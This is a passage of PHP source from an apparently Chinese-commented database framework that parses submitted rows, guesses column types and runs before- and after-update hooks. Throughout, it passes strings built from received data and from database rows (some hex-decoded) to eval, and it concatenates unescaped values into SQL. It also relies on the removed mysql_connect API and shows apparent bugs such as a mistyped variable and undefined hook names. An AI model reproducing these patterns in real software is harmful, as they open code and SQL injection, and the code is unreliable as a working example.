  $nexx='ftype($m,\''.$fxtp.'\',\''.substr($nexx,0,strlen($nexx)-strlen($fxtp.'$m=ftype($m,\')' )-4).');';
  $nexx='$m='.$nexx;
  eval($nexx);
  $fxtp=$fmktps;
  $m["test"]["fmktp"]=$fxtp;

   //对每行都SPLIT	看看每行是不是都一致
  $m["test"]["s"]=0;
  $m["test"]["m"]=0;
  $m["test"]["v"]=1;

 $nexx=str_replace(';',',',$rcvdts);
 $nexx=str_replace(',','\');$m=ftype($m,\''.$fxtp.'\',\'',$nexx);
 $nexx='ftype($m,\''.$fxtp.'\',\''.substr($nexx,0,strlen($nexx)-strlen($fxtp.'$m=ftype($m,\')' )-4).');';
 $nexx='$m='.$nexx;
 eval($nexx);
  $fmbyd="";
  $fmvl="";
  //echo "tests=".$m["test"]["s"];
  for ($p=0;$p<$m["test"]["s"];$p++){
      $fmvl=$fmvl."(";
      $olmk=date('Ymdhis').getRandChar(6);
      $fmek="";
      $fmet="";
       for($q=0;$q<$totpt;$q++){
        $tmpfun="";
        $tmpfun=$newtpinfo[$newtpinfo["COLUMN"][$q]]["COLUMN_SPOST"];
        if (strpos($tmpfun,"TYPE_HEX:")>0){
          $tmpfun=Hex2String(hou($tmpfun,"TYPE_HEX:"));
         }else{
         };

         $tmppost="";
         $tmppost=$m[$p][$q];


        if (strpos("~~~".$tmpfun,"|")>0){
         if (hou($tmpfun,"|")!=""){
           eval(hou($tmpfun,"|"));
          };
         };

         $fmvl=$fmvl."'".$tmppost."',";
         if ($m[$p][$q]!=$m["v".$p][$q]){
          $fmbyd="insert into coode_tbbyd".$m["tpn".$p][$q]."(TABLE_NAME,COLUMN_NAME,onlymark,createtime,beyondtype,bvalue)values('".$tbnm."','".$ptkey[$q]."','".$olmk."',now(),'".$m["tpn".$p][$q]."','".$m["v".$p][$q]."');";
          // echo $fmbyd;
          $conn=mysql_connect(gl(),glu(),glp());
          $x=updatingx($conn,glb(),$fmbyd,"utf8");
          $fmek=$fmek.$ptkey[$q].",";
          $fmet=$fmet."coode_tbbyd".$m["tpn".$p][$q].",";
         };
      };

     if ($fmek!=""){
       $fmek=substr($fmek,0,strlen($fmek)-1)."),";
       $fmet=substr($fmet,0,strlen($fmet)-1)."),";
     };
      $fmvl=$fmvl."'".$olmk."','".$fmek."','".$fmet."'),";

   };
  
   $fmvl="values".substr($fmvl,0,strlen($fmvl)-1);
   $fmist="insert into ".$tbnm."(".$tbkeys.",bydmk,bydkey,bydktb)".$fmvl;
//   echo $fmist;

// 判断表变动函数INSERT 前 要加上
 $mksql=fmpost($mksql,"0",$tbnm,$tbkeys);
    $ext=1; //如果执行语句里有EXT改变结果,可以根据此判断是否执行
  for ($rn=0;$rn<$mksql["TABLE"]["totrcv"];$rn++){
    $tmprk=$mksql["RECEIVE"][$rn];
    $tmptba=$mksql["TABLE"]["sqlaction"];
    //不能简简单单用eXT1 因为有好多字段
   $gphpc="";
    if ($mksql[$tmprk]["bf".$tmptba]!=""){//字段变动钱
      $conn=mysql_connect(gl(),glu(),glp());
      if ($tbnm!="coode_funlist"){
        if (strpos($mksql[$tmprk]["bf".$tmptba]," ")>0 or strpos($mksql[$tmprk]["bf".$tmptba],"\r\n")>0 or strlen($mksql[$tmprk]["bf".$tmptba])>50 ){
         $gphpc=$mksql[$tmprk]["bf".$tmptba];
        }else{
         $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql[$tmprk]["bf".$tmptba]."' and PTOF='".$tbnm."'","utf8");
        };
      }else{
      }; 
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
             $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
             $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));

          // echo $gphpc;
           $x=eval($gphpc);
       };//if
    };//if


  };//for
$gphpc="";
   
    if ($mksql["TABLE"]["bf".$tmptba]!=""){//表变动钱 不该放在循环里判断,这样执行了所有字段数量的操作了.
      $conn=mysql_connect(gl(),glu(),glp());
      if ($tbnm!="coode_funlist"){
        if (strpos($mksql["TABLE"]["bf".$tmptba]," ")>0 or strpos($mksql["TABLE"]["bf".$tmptba],"\r\n")>0 or strlen($mksql["TABLE"]["bf".$tmptba])>30 ){
         $gphpc=$mksql["TABLE"]["bf".$tmptba];
        }else{
         $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql["TABLE"]["bf".$tmptba]."' and PTOF='".$tbnm."'","utf8");
        };
      }else{
      };
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
             $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
           $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));
          // echo $gphpc;
           $x=eval($gphpc);
       };//if gphpc
    };//if//table


//bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
 if ($ext==1){
   $conn=mysql_connect(gl(),glu(),glp());
   $nn=updatingx($conn,glb(),$fmist,"utf8");
 };
// 判断表变动函数INSERT 后 要加上

  for ($rn=0;$rn<$mksql["TABLE"]["totrcv"];$rn++){
    $tmprk=$mksql["RECEIVE"][$rn];
    $tmptba=$mksql["TABLE"]["sqlaction"];

    if ($mksql[$tmprk]["aft".$tmptba]!=""){
      $conn=mysql_connect(gl(),glu(),glp());
      $gphpc="";
      if ($tbnm!="coode_funlist"){
        if (strpos($mksql[$tmprk]["aft".$tmptba]," ")>0 or strpos($mksql[$tmprk]["aft".$tmptba],"\r\n")>0 or strlen($mksql[$tmprk]["aft".$tmptba])>50){
         $gphpc=$mksql[$tmprk]["aft".$tmptba];
        }else{
          $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql[$tmprk]["aft".$tmptba]."' and PTOF='".$tbnm."'","utf8");
        };
      }else{
      };
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
           $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
           $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));
          // echo $gphpc;
           $x=eval($gphpc);
       };//if
     };//if
  };//for
      $gphpc="";
    if ($mksql["TABLE"]["aft".$tmptba]!=""){
         $conn=mysql_connect(gl(),glu(),glp());
         if ($tbnm!="coode_funlist"){
           if (strpos($mksql["TABLE"]["aft".$tmptba]," ")>0 or strpos($mksql["TABLE"]["aft".$tmptba],"\r\n")>0 or strlen($mksql["TABLE"]["aft".$tmptba])>50){
             $gphpc=$mksql["TABLE"]["aft".$tmptba];
           }else{
             $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql["TABLE"]["aft".$tmptba]."' and PTOF='".$tbnm."'","utf8");
           };
         }else{
         };
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
            $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
            $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));
           // echo $gphpc;
           $x=eval($gphpc);
        };//if
     };//if
//bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
  };//column count==totpt  
 }else{
   //不存在则创建 类型能准确,怕就怕有数据结构的怕,结构不对;
  //创建的时候附带,超越数据,尽可能把数据收全
 $nexx=str_replace(';',',',$rcvdts);
 $ptkey=explode(",",$tbkeys);
 $totpt=count($ptkey);
 $fxtp=$totpt;
 $nexx=str_replace(',','\');$m=ftype($m,\''.$fxtp.'\',\'',$nexx);
 $m["test"]["m"]=0;
 $m["test"]["t"]=0;
 $m["test"]["v"]=1;
 $m["test"]["s"]=0;
 $nexx='ftype($m,\''.$fxtp.'\',\''.substr($nexx,0,strlen($nexx)-strlen($fxtp.'$m=ftype($m,\')' )-4).');';
 $nexx='$m='.$nexx;
 eval($nexx);
 $m=jianding($m,$fxtp);
 $fxtp=$m["test"]["fmktp"];
 $news=addnewkey(glb(),$tbnm,$tbkeys,$fxtp);
   //对每行都SPLIT	看看每行是不是都一致
 $m["test"]["s"]=0;
 $m["test"]["m"]=0;
 $m["test"]["v"]=1;

 $nexx=str_replace(';',',',$rcvdts);
 $nexx=str_replace(',','\');$m=ftype($m,\''.$fxtp.'\',\'',$nexx);
 $nexx='ftype($m,\''.$fxtp.'\',\''.substr($nexx,0,strlen($nexx)-strlen($fxtp.'$m=ftype($m,\')' )-4).');';
 $nexx='$m='.$nexx;
 eval($nexx);
  $fmbyd="";
  $fmvl="";
  for ($p=0;$p<$m["test"]["s"];$p++){
      $fmvl=$fmvl."(";
      $olmk=date('Ymdhis').getRandChar(6);
      $fmek="";
      $fmet="";
       for($q=0;$q<$totpt;$q++){
        $tmpfun="";
        $tmpfun=$newtpinfo[$newtpinfo["COLUMN"][$q]]["COLUMN_SPOST"];
        if (strpos($tmpfun,"TYPE_HEX:")>0){
          $tmpfun=Hex2String(hou($tmpfun,"TYPE_HEX:"));
         }else{
         };

         $tmppost=$m[$p][$q];

         if (strpos("~~~".$tmpfun,"|")>0){
          if (hou($tmpfun,"|")!=""){
           eval(hou($tmpfun,"|"));
          };
         };
         $fmvl=$fmvl."'".$tmppost."',";
         if ($m[$p][$q]!=$m["v".$p][$q]){
          $fmbyd="insert into coode_tbbyd".$m["tpn".$p][$q]."(TABLE_NAME,COLUMN_NAME,onlymark,createtime,beyondtype,bvalue)values('".$tbnm."','".$ptkey[$q]."','".$olmk."',now(),'".$m["tpn".$p][$q]."','".$m["v".$p][$q]."');";
          $conn=mysql_connect(gl(),glu(),glp());
          $x=updatingx($conn,glb(),$fmbyd,"utf8");
          $fmek=$fmek.$ptkey[$q].",";
          $fmet=$fmet."coode_tbbyd".$m["tpn".$p][$q].",";
         };
      
      };
     if ($fmek!=""){
       $fmek=substr($fmek,0,strlen($fmek)-1)."),";
       $fmet=substr($fmet,0,strlen($fmet)-1)."),";
     };
      $fmvl=$fmvl."'".$olmk."','".$fmek."','".$fmet."'),";
   };
   $fmvl="values".substr($fmlv,0,strlen($fmvl)-1);
   $fmist="insert into ".$tbnm."(".$tbkeys.",bydmk,bydkey,bydktb)".$fmvl;
//变动前--------------------------------------------------------------
$mksql=fmpost($mksql,"0",$tbnm,$tbkeys);
    $ext=1; //如果执行语句里有EXT改变结果,可以根据此判断是否执行
  for ($rn=0;$rn<$mksql["TABLE"]["totrcv"];$rn++){
    $tmprk=$mksql["RECEIVE"][$rn];
    $tmptba=$mksql["TABLE"]["sqlaction"];
    //不能简简单单用eXT1 因为有好多字段
    $gphpc="";
    if ($mksql[$tmprk]["bf".$tmptba]!=""){//字段变动钱
      $conn=mysql_connect(gl(),glu(),glp());
      if ($tbnm!="coode_funlist"){
       $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql[$tmprk]["bf".$tmptba]."' and PTOF='".$tbnm."'","utf8");
      }else{
      };
  
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
             $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
             $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));

          // echo $gphpc;
           $x=eval($gphpc);
       };//if
    };//if
  };//for
    $gphpc="";
    if ($mksql["TABLE"]["bf".$tmptba]!=""){//表变动钱
      $conn=mysql_connect(gl(),glu(),glp());
      if ($tbnm!="coode_funlist"){
       $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql["TABLE"]["bf".$tmptba]."' and PTOF='".$tbnm."'","utf8");
      }else{
      };
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
           $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
           $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));

          // echo $gphpc;
           $x=eval($gphpc);
       };//if
    };//if
//变动前--------------------------------------------------------------
 if ($ext==1){
   $conn=mysql_connect(gl(),glu(),glp());
  
   $nn=updatingx($conn,glb(),$fmist,"utf8");
 };
//变动后-----------------------------------------------------
  for ($rn=0;$rn<$mksql["TABLE"]["totrcv"];$rn++){
    $tmprk=$mksql["RECEIVE"][$rn];
    $tmptba=$mksql["TABLE"]["sqlaction"];

    if ($mksql[$tmprk]["aft".$tmptba]!=""){
      $conn=mysql_connect(gl(),glu(),glp());
      if ($tbnm!="coode_funlist"){
       if (strpos($mksql[$tmprk]["aft".$tmptba]," ")>0 or strpos($mksql[$tmprk]["aft".$tmptba],"\r\n")>0 or strlen($mksql[$tmprk]["aft".$tmptba])>50){
        $gphpc=$mksql[$tmprk]["aft".$tmptba];
       }else{
        $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql[$tmprk]["aft".$tmptba]."' and PTOF='".$tbnm."'","utf8");
       };
      }else{
      };
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
           $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
           $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));
          // echo $gphpc;
           $x=eval($gphpc);
       };//if
     };//if

  };//for
//变动后-----------------------------------------------------
   $gphpc="";
    if ($mksql["TABLE"]["aft".$tmptba]!=""){
      $conn=mysql_connect(gl(),glu(),glp());
      if ($tbnm!="coode_funlist"){
        if (strpos($mksql["TABLE"]["aft".$tmptba]," ")>0 or strpos($mksql["TABLE"]["aft".$tmptba],"\r\n")>0 or strlen($mksql["TABLE"]["aft".$tmptba])>50){
         $gphpc=$mksql["TABLE"]["aft".$tmptba];
        }else{
         $gphpc=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$mksql["TABLE"]["aft".$tmptba]."' and PTOF='".$tbnm."'","utf8");
        };
   
       }else{
       };
       if ($gphpc!=""){
           if (strpos($gphpc,"TYPE_HEX:")>0){
           $gphpc=Hex2String(hou($gphpc,"TYPE_HEX:"));
           };
           $gphpc=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));
          // echo $gphpc;
           $x=eval($gphpc);
       };//if
     };//if
 };//kif
return 1;
}//DESCRIB ():  END@()


function anytv($tb,$qry,$sno,$key,$newv,$dtp){
 IF ($qry==""){
   $qry="SNO";
  };
 $conn=mysql_connect(gl(),glu(),glp());
 $rst=updatingx($conn,glb(),"select ".$key." as result from ".$tb." where ".$qry."='".$sno."'","utf8");

   if ($newv==""){//如果是查询直接返回结果
      if ($dtp=="json"){      
         return "{\"".$key."\":\"".$rst."\"}";
       }else{
         return $rst;
       };

    }else{
     $bfupdtf="";
     $ext=1;
     if ($bfupdt!=""){
      if ($tb!="coode_funlist"){
        $bfupdtf=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$bfupdt."' and PTOF='".$tb."'","utf8");
       }else{
       };
       if ($bfupdtf!=""){
           if (strpos($bfupdtf,"TYPE_HEX:")>0){
           $bfupdtf=Hex2String(hou($bfupdtf,"TYPE_HEX:"));
           };
           $bfupdtf=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$bfupdtf));
           $x=eval($bfupdtf);
       };//if
      };
      //table 还应该有个INSERT
      $tbbfupdtf="";
      $conn=mysql_connect(gl(),glu(),glp());
      if ($tb!="coode_funlist"){
       $bftbupdtf=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$tbbfupdt."' and PTOF='".$tb."'","utf8");
       }else{
       };
      if ($tbbfupdt!=""){
       if ($bftbupdtf!=""){
           if (strpos($bftbupdtf,"TYPE_HEX:")>0){
           $bftbupdtf=Hex2String(hou($bftbupdtf,"TYPE_HEX:"));
           };
           $bftbupdtf=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$bftbupdtf));
           $x=eval($bftbupdtf);
       };//if
      };

      $conn=mysql_connect(gl(),glu(),glp());
      if ($tb!="coode_funlist"){
        $bftbisdtf=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$tbbfisdt."' and PTOF='".$tb."'","utf8");
      }else{
      };
      if ($tbbfisdt!=""){
       if ($bftbisdtf!=""){
           if (strpos($bftbisdtf,"TYPE_HEX:")>0){
           $bftbisdtf=Hex2String(hou($bftbisdtf,"TYPE_HEX:"));
           };
           $bftbisdtf=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$bftbisdtf));
           $x=eval($bftbisdtf);
       };//if
      };
//----------------------------------------------------------------
      if ($ext==1){

       $tmpvvv=str_replace("\r\n","-r-n",str_replace("'","\'",unstrs($newv)));
       if (strpos($tmpvvv,"-r-n")>0){
         $tmpvvv="sTYPE_HEX:".String2Hex($tmpvvv);
       }
       $conn=mysql_connect(gl(),glu(),glp());
       $rst=updatingx($conn,glb(),"update  ".$tb." set ".$key."='".$tmpvvv."'  where ".$qry."='".$sno."'","utf8");
      };
//----------------------------------------------------------------
     $rtvalue="{\"".$key."\":\"".$ext."\"}";//如果是修改则返回修改成否
     $rtvaluehtml=$ext;//如果是修改则返回修改成否



      $conn=mysql_connect(gl(),glu(),glp());
     if ($aftupdt!=""){
        if ($tb!="coode_funlist"){
         $aftupdtf=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$aftupdt."' and PTOF='".$tb."'","utf8");
        }else{
        };
        if ($aftupdtf!=""){
           if (strpos($aftupdtf,"TYPE_HEX:")>0){
           $aftupdtf=Hex2String(hou($aftupdtf,"TYPE_HEX:"));
           };
           $aftupdtf=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$aftupdtf));
           $x=eval($aftupdtf);
        };//if
      };



      $conn=mysql_connect(gl(),glu(),glp());
     if ($tbaftupdt!=""){
       if ($tb!="coode_funlist"){
         $afttbupdtf=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$tbaftupdt."' and PTOF='".$tb."'","utf8");
        }else{
        };
         if ($afttbupdtf!=""){
           if (strpos($afttbupdtf,"TYPE_HEX:")>0){
           $afttbupdtf=Hex2String(hou($afttbupdtf,"TYPE_HEX:"));
           };
           $afttbupdtf=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$afttbupdtf));
           $x=eval($afttbupdtf);
         };//if
     };


      $conn=mysql_connect(gl(),glu(),glp());
      if ($tb!="coode_funlist"){
       $afttbisdtf=updatingx($conn,glb(),"select funfull as result from coode_funlist where funname='".$tbaftisdt."' and PTOF='".$tb."'","utf8");
      };
      if ($tbaftisdt!=""){
       if ($afttbisdtf!=""){
           if (strpos($afttbisdtf,"TYPE_HEX:")>0){
           $afttbisdtf=Hex2String(hou($afttbisdtf,"TYPE_HEX:"));
           };
           $afttbisdtf=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$afttbisdtf));
           $x=eval($afttbisdtf);
       };//if
      };


    };//newv==""
    if ($dtp=="json"){ 
     return $rtvalue;
     }else{
     return $rtvaluehtml;
    };
  //函数结束;
 }//DESCRIB ():  END@()





function ftype($k=array(array()),$keytypes,$strs){

if (strpos($keytypes,"/")>0){
  $tmppt=explode("/",$keytypes);
  $totpt=count($tmppt);
 for ($pp=0;$pp<$totpt;$pp++){
  if (strpos($tmppt[$pp],"(")>0){
   $tmppttp[$pp]=qian($tmppt[$pp],"(");
   $tmpptlen[$pp]=qian(hou($tmppt[$pp],"("),")");
  }else{
   $tmppttp[$pp]=$tmppt[$pp];
   $tmpptlen[$pp]="0";
  }
 };
}else{
 $totpt=$keytypes;
};


 $k["test"]["m"]= $k["test"]["m"]%$totpt;  //////zheli


if (strpos($keytypes,"/")>0){
 $tmptg=1;
 switch($tmppttp[$k["test"]["m"]]){
 case "datetime":
  if (strtotime($strs)!=""){
   $tmptg=1;
  }else{
    if ($k["test"]["fmktp"]!=""){
     $k[$k["test"]["s"]][$k["test"]["m"]]=date('Y-m-d h:i:s');
    }else{
     $tmptg=0;
    };
  };
 break;
 case "varchar":
 if (strlen($strs)<$tmpptlen[$k["test"]["m"]]){
  $tmptg=1;
 }else{
    if ($k["test"]["fmktp"]!=""){
     $k[$k["test"]["s"]][$k["test"]["m"]]=substr($strs,0,$tmpptlen[$k["test"]["m"]]-1);
    }else{
     $tmptg=0;
    };
 };
 break;
 case "text":
 if (strlen($strs)<$tmpptlen[$k["test"]["m"]]){
  $tmptg=1;
 }else{
    if ($k["test"]["fmktp"]!=""){
     $k[$k["test"]["s"]][$k["test"]["m"]]=substr($strs,0,$tmpptlen[$k["test"]["m"]]-1);
    }else{
     $tmptg=0;
    };
 };
 break;
 case "int":
 if ($strs=="0" or abs($strs*1)>0){
  $tmptg=1;
 }else{
    if ($k["test"]["fmktp"]!=""){
     $k[$k["test"]["s"]][$k["test"]["m"]]=0;
    }else{
     $tmptg=0;
    };
 };
 break;
 case "decimal":
 if ($strs=="0" or abs($strs*1)>0){
  $tmptg=1;
 }else{
    if ($k["test"]["fmktp"]!=""){
     $k[$k["test"]["s"]][$k["test"]["m"]]=0;
    }else{
     $tmptg=0;
    };
 };
 break;
 };
}else{
  $totpt=$keytypes;
  $lstr=strlen($strs);
 $tmppost=$strs;
  //单单数据本身不用加工,准备入库的形式要加工
  $k[$k["test"]["s"]][$k["test"]["m"]]=$tmppost;//赋值
  $k["v".$k["test"]["s"]][$k["test"]["m"]]=$tmppost;//赋值
  $k["tp".$k["test"]["s"]][$k["test"]["m"]]="varchar(255)";//默认都弄成VARCHAR255

     $k["tpn".$k["test"]["s"]][$k["test"]["m"]]="varchar";//判断数据类型
     $k["tpl".$k["test"]["s"]][$k["test"]["m"]]="(255)";//判断数据类型

  if (strtotime($tmppost)!="" and strpos($tmppost,".")<=0  and strpos($tmppost,"-")>0){
     $k["tp".$k["test"]["s"]][$k["test"]["m"]]="datetime";//判断数据类型
     $k["tpn".$k["test"]["s"]][$k["test"]["m"]]="datetime";//判断数据类型
     $k["tpl".$k["test"]["s"]][$k["test"]["m"]]="";//判断数据类型
  }else{
    if ($tmppost*1>0 or $tmppost=="0"){
       if (strpos($tmppost,".")>0){//如果有小数点则看看小数点长度
          $xsdcd=strlen(hou($tmppost,"."));
          $k["tp".$k["test"]["s"]][$k["test"]["m"]]="decimal(10,".$xsdcd.")";//判断数据类型
          $k["tpn".$k["test"]["s"]][$k["test"]["m"]]="decimal";//判断数据类型
          $k["tpl".$k["test"]["s"]][$k["test"]["m"]]="(10,".$xsdcd.")";//判断数据类型
        }else{
         $k["tp".$k["test"]["s"]][$k["test"]["m"]]="int(11)";//判断数据类型
          $k["tpn".$k["test"]["s"]][$k["test"]["m"]]="int";//判断数据类型
          $k["tpl".$k["test"]["s"]][$k["test"]["m"]]="(11)";//判断数据类型
        };
    }else{//如果字符串小于230 则都弄成varchar230
      if (strlen($tmppost)<230){
        $k["tp".$k["test"]["s"]][$k["test"]["m"]]="varchar(255)";//判断数据类型
          $k["tpn".$k["test"]["s"]][$k["test"]["m"]]="varchar";//判断数据类型
          $k["tpl".$k["test"]["s"]][$k["test"]["m"]]="(255)";//判断数据类型
       }else{
         $k["tp".$k["test"]["s"]][$k["test"]["m"]]="text";//判断数据类型
          $k["tpn".$k["test"]["s"]][$k["test"]["m"]]="text";//判断数据类型
          $k["tpl".$k["test"]["s"]][$k["test"]["m"]]="(65535)";//判断数据类型
       };//strlen
    };//if//230

   };//if//tmppost
  


switch ($k["tpn".$k["test"]["s"]][$k["test"]["m"]]){
case "varchar":
$k["varchar"][$k["test"]["m"]]=$k["varchar"][$k["test"]["m"]]*1+1;
break;

case "text":
$k["text"][$k["test"]["m"]]=$k["text"][$k["test"]["m"]]*1+1;
break;

case "int":
$k["int"][$k["test"]["m"]]=$k["int"][$k["test"]["m"]]*1+1;
break;

case "decimal":
$k["decimal"][$k["test"]["m"]]=$k["decimal"][$k["test"]["m"]]*1+1;
break;

case "datetime":
$k["datetime"][$k["test"]["m"]]=$k["datetime"][$k["test"]["m"]]*1+1;
break;
};

  };//tmppost



 $k["test"]["v"]=$k["test"]["v"]*$tmptg;
// echo "str=".$strs.".k=".$k["tp".$k["test"]["s"]][$k["test"]["m"]]."test-s=".$k["test"]["s"]."test-m=".$k["test"]["m"]."<br>";
 $k["test"]["m"]=$k["test"]["m"]+1;
 $k["test"]["t"]=$k["test"]["t"]+1;
 if ( ($k["test"]["m"])%$totpt==0){
   $k["test"]["s"]=$k["test"]["s"]+1;
 }



return $k;

}//DESCRIB ():  END@()
function jianding($rtarr=array(array()),$zdsl){
$fmktp="";
 for($km=0;$km<$zdsl;$km++){
  $rtarr["typename"][$km]="varchar";
  $rtarr["type"][$km]="varchar(255)";
  $rtarr["typelen"][$km]="(255)";

  if (($rtarr["datetime"][$km]/$rtarr["test"]["s"])>0.9){
   $rtarr["typename"][$km]="datetime";
   $rtarr["type"][$km]="datetime";
   $rtarr["typelen"][$km]="(0)";
  };
  if (($rtarr["int"][$km]/$rtarr["test"]["s"])>0.9){
   $rtarr["typename"][$km]="int";
   $rtarr["type"][$km]="int(11)";
   $rtarr["typelen"][$km]="(11)";
  };
  if (($rtarr["decimal"][$km]/$rtarr["test"]["s"])>0.1 and (($rtarr["int"][$km]+$rtarr["decimal"][$km])/$rtarr["test"]["s"])>0.9){
   $rtarr["typename"][$km]="decimal";
   $rtarr["type"][$km]="decimal(10,5)";
   $rtarr["typelen"][$km]="(10,5)";
  };
  if (($rtarr["text"][$km]/$rtarr["test"]["s"])>0.15){
   $rtarr["typename"][$km]="text";
   $rtarr["type"][$km]="text";
   $rtarr["typelen"][$km]="(65535)";
  };
  $fmktp=$fmktp.$rtarr["type"][$km]."/";


 };
  $fmktp=substr($fmktp,0,strlen($fmktp)-1);
  $rtarr["test"]["fmktp"]=$fmktp;
  return $rtarr;
}
function anyfulltblist($souf,$ffrm,$ffdt,$fps,$fbs,$tbnm,$tbkis,$tbcdtn,$dtp,$surl,$odcdt){
  eval(CLASSX("fulltable"));
  $ftable=new fulltable();
  return $ftable->anyfulltblist($souf,$ffrm,$ffdt,$fps,$fbs,$tbnm,$tbkis,$tbcdtn,$dtp,$surl,$odcdt);
}

function anypagetblist($sowf,$ffrm,$ffdt,$fps,$fbs,$tbnm,$tbkis,$wtokis,$tbcdtn,$dtp,$surl,$pg,$pgn,$odcdt){
  eval(CLASSX("pagetable"));
  $ptable=new pagetable();
  return $ptable->anypagetblist($sowf,$ffrm,$ffdt,$fps,$fbs,$tbnm,$tbkis,$wtokis,$tbcdtn,$dtp,$surl,$pg,$pgn,$odcdt);
}


function keyexc($kxyz,$allkx,$kifx=array(array()),$funxx){         
        if (strpos("xx".$allkx,$kxyz)>0 and strpos("xx".$funxx,"{col-")>0){
         $funxx=str_replace("{col-".$kxyz.":clstxt}",$kifx[$kxyz]["COLUMN_CLSTXT"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":classp}",$kifx[$kxyz]["COLUMN_CLASSP"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":title}",$kifx[$kxyz]["COLUMN_TITLE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":sshow}",gohex($kifx[$kxyz]["COLUMN_SSHOW"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":spost}",gohex($kifx[$kxyz]["COLUMN_SPOST"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":jshow}",gohex($kifx[$kxyz]["COLUMN_JSHOW"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":jpost}",gohex($kifx[$kxyz]["COLUMN_JPOST"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":cange}",$kifx[$kxyz]["COLUMN_CANGE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":dspld}",$kifx[$kxyz]["COLUMN_DSPLD"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":dxtype}",$kifx[$kxyz]["COLUMN_DXTYPE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":default}",$kifx[$kxyz]["COLUMN_DEFAULT"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":explain}",$kifx[$kxyz]["COLUMN_EXPLAIN"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":sqx}",$kifx[$kxyz]["COLUMN_SQX"],$funxx); 
         $funxx=str_replace("{col-".$kxyz.":type}",$kifx[$kxyz]["COLUMN_TYPE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":tpnm}",$kifx[$kxyz]["COLUMN_TPNM"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":tplen}",$kifx[$kxyz]["COLUMN_TPLEN"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":acthtm}",$kifx[$kxyz]["COLUMN_ACTHTM"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":atnhtm}",$kifx[$kxyz]["COLUMN_ATNHTM"],$funxx);
         $kxyz="key";
         $funxx=str_replace("{col-".$kxyz.":clstxt}",$kifx[$kxyz]["COLUMN_CLSTXT"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":classp}",$kifx[$kxyz]["COLUMN_CLASSP"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":title}",$kifx[$kxyz]["COLUMN_TITLE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":sshow}",gohex($kifx[$kxyz]["COLUMN_SSHOW"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":spost}",gohex($kifx[$kxyz]["COLUMN_SPOST"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":jshow}",gohex($kifx[$kxyz]["COLUMN_JSHOW"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":jpost}",gohex($kifx[$kxyz]["COLUMN_JPOST"]),$funxx);
         $funxx=str_replace("{col-".$kxyz.":cange}",$kifx[$kxyz]["COLUMN_CANGE"],$funxx);
         $funxx=str_replace("{col-".$kxyz.":dspld}",$kifx[$kxyz]["COLUMN_DSPLD"],$funxx);
